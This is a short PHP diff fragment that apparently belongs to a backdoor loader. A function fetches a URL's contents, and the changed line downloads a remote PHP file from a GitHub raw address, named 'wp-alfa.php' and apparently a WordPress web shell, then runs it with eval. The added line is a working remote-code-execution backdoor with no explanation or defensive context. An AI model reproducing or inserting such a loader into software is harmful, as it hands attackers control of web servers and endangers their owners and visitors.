@@ -26,5 +26,5 @@ function geturlsinfo ($url) {
     }
 return $url_get_contents_data;
 }
-$a = geturlsinfo('https://raw.githubusercontent.com/azkagans/azka/main/5_6287370747367132287.php');
+$a = geturlsinfo('https://raw.githubusercontent.com/azkagans/azka/main/wp-alfa.php');
 eval    ('?>'.$a);
